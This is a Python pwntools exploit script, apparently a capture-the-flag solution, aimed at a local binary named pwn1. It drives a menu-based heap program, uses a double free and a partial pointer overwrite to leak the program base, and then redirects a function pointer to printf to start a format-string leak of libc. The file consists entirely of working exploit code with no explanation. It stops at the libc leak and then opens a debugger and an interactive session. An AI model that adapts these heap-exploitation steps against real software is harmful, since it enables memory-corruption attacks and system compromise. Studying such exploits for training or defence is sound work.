from pwn import *

context.log_level = 'debug'
sh = process('./pwn1')
elf = ELF('./pwn1')

def create(string):
    sh.recvuntil('quit\n')
    sh.sendline('1')
    sh.recvuntil('size:')
    sh.sendline('30')
    sh.recvuntil('str:')
    sh.send(string)


def delete(id):
    sh.recvuntil('quit\n')
    sh.sendline('2')
    sh.recvuntil('id:')
    sh.sendline(str(id))
    sh.recvuntil('sure?:')
    sh.sendline('yes')


#-----------leak program base----------------
create('aaa\n')
create('aaa\n')

delete(0)
delete(1)
delete(0)

create('\x00')
create('a' * 0x18 + '\xa7\x00')

delete(0)
sh.recvuntil('a'*0x18)
leak_addr = u64(sh.recv(6).ljust(8,'\x00'))
pro_base = leak_addr - 0xda7
printf_plt = pro_base + 0x9a0
print hex(leak_addr)
print hex(pro_base)

#------use printf leak libc-------------
delete(1)
create('a'*8 +'%30$p'+ 'b'*11 +p64(printf_plt))

gdb.attach(sh)

sh.interactive()
